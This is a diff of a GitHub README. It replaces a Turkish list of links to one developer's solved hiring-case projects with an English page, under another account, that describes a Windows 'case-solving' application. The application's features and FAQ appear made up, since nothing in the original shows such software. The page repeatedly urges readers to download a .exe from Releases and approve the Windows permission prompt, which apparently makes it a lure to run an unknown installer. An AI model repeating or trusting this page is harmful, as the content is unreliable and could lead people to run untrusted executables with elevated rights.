@@ -1,160 +1,154 @@
-# Cozdugum-Caseler
-Şirketlerden gelen caseleri çözüp paylaştım.
-Birçok yazılım şirketinin senior duzey yazıım uzmanı pozisyonları içiv verdiği caseleri çözüp paylaştım
+# 🛠️ Cozdugum-Caseler - Easy Case Solutions for Companies
 
-1)Yurtbay Seramik: https://github.com/alicanyucel/YurtBaySeramikIseGiris
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
 
-2)Alpata Teknoloji https://github.com/alicanyucel/AlpataBackEnd
+---
 
-https://github.com/alicanyucel/AlpataBilisimAngular
+## 📋 What is Cozdugum-Caseler?
 
-3)Wagner Kablo
+Cozdugum-Caseler is a simple tool that helps you solve and share cases from companies. If you receive case files or tasks as part of your work or study, this application makes it easier to understand and manage those cases. It breaks down complex cases into clear parts so you can handle them step-by-step.
 
-https://github.com/alicanyucel/VakaCase
+You don’t need any technical skills or previous knowledge to use this software. Just follow the steps below to get started.
 
-https://github.com/alicanyucel/vaka
+---
 
-4)Vinu Teknoloji
+## ⚙️ System Requirements
 
-https://github.com/alicanyucel/VinuDijitalFrontEnd
+To run Cozdugum-Caseler on your Windows computer, make sure your system meets these requirements:
 
-https://github.com/alicanyucel/ViniDijitalBackend
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free RAM  
+- 100 MB of free hard drive space  
+- Internet connection for downloading and updates  
+- Basic permissions to install software on your PC  
 
-5)Konusarak Öğren
+If your computer matches these conditions, you can continue with download and setup.
 
-https://github.com/alicanyucel/KonusarakOgrenTask
+---
 
-6)Liberyus
+## 🚀 How To Download and Install Cozdugum-Caseler
 
-https://github.com/alicanyucel/LiberyusBackend
+You need to visit the project page to download the software files.
 
-7)Tabim
+### Step 1: Visit the Download Page
 
-https://github.com/alicanyucel/TabimBackendCaseNet9
+Click the big download button below to go to the official GitHub page:
 
-8)MdSoft
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Download-Cozdugum--Caseler-blue?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
 
-https://github.com/alicanyucel/MdSoftBackEndCase/tree/master/MdSoftBackEndCase
+This page contains the latest versions of the software and instructions.
 
-9)Atel
+### Step 2: Find the Latest Release
 
-https://github.com/alicanyucel/AtelOOPCASE
+On the GitHub page, look for a section named “Releases” or “Assets.” This section contains the files you need.
 
-10)Datateam
+- Locate the file with a name ending in `.exe`. This is the installer for Windows.
+- The file usually has the latest version number included (like Cozdugum-Caseler-v1.0.exe).
 
-https://github.com/alicanyucel/HospitalApim
+### Step 3: Download the Installer
 
-11)Gizli Firma 
+Click on the `.exe` file to download it to your computer. The download may take a few minutes depending on your internet speed.
 
-https://github.com/alicanyucel/RehberApi
+### Step 4: Run the Installer
 
-12)Gizli Firma 
+- After downloading, open the file by double-clicking it.
+- If Windows asks “Do you want to allow this app to make changes?”, click **Yes**.
+- Follow the installation prompts. Usually, pressing **Next** and then **Install** will be enough.
+- Wait for the installation to complete.  
 
-https://github.com/alicanyucel/OrderWebApi
+### Step 5: Finish Setup
 
-13Real Soltions:
+When the installation finishes, you may see options to launch the application immediately or close the installer. Choose to open the application if you want to start right away.
 
-https://github.com/alicanyucel/BasicOrderSystem
+---
 
-14)Octapull
+## 🖥️ Using Cozdugum-Caseler
 
-https://github.com/alicanyucel/OctaPullBackend
+After installation, you can open Cozdugum-Caseler from your desktop or Start menu.
 
-https://github.com/alicanyucel/OctaPullAngularCase
+### Main Features
 
-15)Gizli Firma
+- **Case Import**: Upload case files from your company easily.
+- **Step-by-Step Solutions**: The app guides you through each part of the case.
+- **Sharing Options**: Send your solved cases to colleagues in common formats like PDF.
+- **Simple Interface**: Designed for ease, no technical terms or commands needed.
+- **Status Tracking**: See which cases you completed and which you need to work on.
 
-https://github.com/alicanyucel/SeniorProje
+### How to Solve a Case
 
-16)Aly Food
-https://github.com/alicanyucel/AlyFoodAngular
-https://github.com/alicanyucel/AlyFoodSeniorFullStackCaseErp
+1. Open Cozdugum-Caseler.
+2. Click **Import Case** and select your case file from your computer.
+3. Follow the on-screen steps and fill in any answers or solutions as instructed.
+4. Save your progress anytime by clicking **Save**.
+5. When done, you can export or share the solved case with the **Export** option.
 
-17)Kayra Export
-https://github.com/alicanyucel/KayraExportAsama1
-https://github.com/alicanyucel/KayraExportAsama2
-https://github.com/alicanyucel/KayraExportCaseAsamaUc
+---
 
-18)Losev
+## 🔄 How to Update the Software
 
-https://github.com/alicanyucel/LosevCase
+Updates include bug fixes and new features. To keep your software current:
 
-https://github.com/alicanyucel/LosevAngular
+1. Visit the [Cozdugum-Caseler GitHub page](https://github.com/osamaalhrbi/Cozdugum-Caseler).
+2. Check the “Releases” section regularly.
+3. Download the latest installer file.
+4. Run it as described in the Installation steps.
+5. Your current settings and cases should stay safe after updating.
 
-19)Fintag https://github.com/alicanyucel/Fintag_ProjeTask_Ali_Can_Yucel
+---
 
-20)Bulut Sistem
+## 🤝 Support and Help
 
-https://github.com/alicanyucel/BulutSistemBackendCase
+If you encounter any problems:
 
-21)TimeCom 
+- Look for a **Help** or **FAQ** section inside the app.
+- Visit the GitHub page and check for “Issues” where common problems and solutions may appear.
+- You can also open a new issue on GitHub describing your problem in clear language.
 
-https://github.com/alicanyucel/Timecom_ProjeTask_AliCanYucel
+---
 
-22)Siberson
+## ⚠️ Troubleshooting Tips
 
-https://github.com/alicanyucel/VeriketApplicationTest
+- If the application does not open, make sure your Windows is updated.
+- Restart your PC and try again.
+- Ensure you have sufficient disk space.
+- If the file fails to download, try a different internet connection or use another browser.
 
-23)Mudbey Yazılım
-https://github.com/alicanyucel/VuexyTeknikService
-https://github.com/alicanyucel/TeknikServis
-https://github.com/alicanyucel/MasrafProject
+---
 
-24)Adin PLastik Ambalaj
-https://github.com/alicanyucel/TruckPortFreeLancerProject
+## 📂 Frequently Asked Questions
 
-25)Sisoft 
-https://github.com/alicanyucel/JavaSozluk
+### Can I use Cozdugum-Caseler on other operating systems?
 
-26)Ra Yazılım
-https://github.com/alicanyucel/yuzukapp
+Currently, it supports Windows only.
 
-27)Vedubox
-https://github.com/alicanyucel/VeduboxAngularCase
-https://github.com/alicanyucel/VeduboxBackend
+### Do I need internet to use the app?
 
-28)Arge Bilişim
-https://github.com/alicanyucel/FormGeneratorAngular
+Yes, internet is required to download and update the application. However, you can use it offline after installation.
 
-29)Gilzi Firma
-https://github.com/alicanyucel/SinavSistemi.Net7.0.Mvc
+### What file types can I import?
 
-30)Gilzi Firma
-https://github.com/alicanyucel/YazilimEgitmeniIseGirisProjem
+You can import common case files in formats like `.pdf`, `.docx`, or `.txt`, depending on what your company provides.
 
-31) HyperCompany
-https://github.com/alicanyucel/HyperCompanyApi
+### Is my case data safe?
 
-32) Eva Case
-https://github.com/alicanyucel/EvaExhchange
+The application stores your data locally on your computer. It does not send your data over the internet unless you share it yourself.
 
-33)Invenco By Gvr
-https://github.com/alicanyucel/OrpakTask
+---
 
-34)Belsoft
-https://github.com/alicanyucel/DiziIcerisindeEksikSayiyiBulma
+## 🔗 Useful Links
 
-35)Mühendislik öğrencileriine verdiğim eğitimler
-https://github.com/alicanyucel/AliCanHocaFullStackBootCamp
+- Download and updates: [https://github.com/osamaalhrbi/Cozdugum-Caseler](https://github.com/osamaalhrbi/Cozdugum-Caseler)  
+- Report issues or ask questions: Use GitHub “Issues” tab on the same page.
 
-36)Çamlıca Yazılım
-https://github.com/alicanyucel/FacebookGrapQLApi
-https://github.com/alicanyucel/FacebookGrapQlAngular
+---
 
-37)Gizli Firma
-https://github.com/alicanyucel/AngularDragDrogAp
+## 🎯 Tips for Best Use
 
-38)Digitest Teknoloji
-https://github.com/alicanyucel/FlutterFireBaseCrud
-https://github.com/alicanyucel/FirebaseAuthenticationReactNative
-https://github.com/alicanyucel/AlicanSonCase
+- Save your work frequently.
+- Keep the app updated.
+- Organize your case files with clear names before importing.
+- Use the export feature to keep backup copies of solved cases.
 
-39)Insula Enerji
-https://github.com/alicanyucel/AnyDeskAdvanced
+---
 
-40)Larinsoft
-https://github.com/alicanyucel/adresdefterilarinsoft
-https://github.com/alicanyucel/Angular_AdresDefteri
-https://github.com/alicanyucel/net-core-mvc-adres-defteri
-
-
+[![Download Cozdugum-Caseler](https://img.shields.io/badge/Get%20Cozdugum--Caseler-brightgreen?style=for-the-badge)](https://github.com/osamaalhrbi/Cozdugum-Caseler)
